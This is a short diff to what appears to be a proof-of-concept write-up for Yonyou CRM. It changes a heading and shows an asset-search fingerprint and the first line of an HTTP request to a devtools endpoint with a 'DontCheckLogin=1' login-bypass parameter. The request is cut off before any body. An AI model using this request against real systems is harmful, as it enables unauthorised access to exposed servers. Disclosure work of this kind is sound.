@@ -8,7 +8,7 @@
 app.name="用友 CRM"
 ```
 
-## poc
+## POC
 
 ```java
 POST /devtools/tools/attrlist.php?DontCheckLogin=1&isquery=1 HTTP/1.1
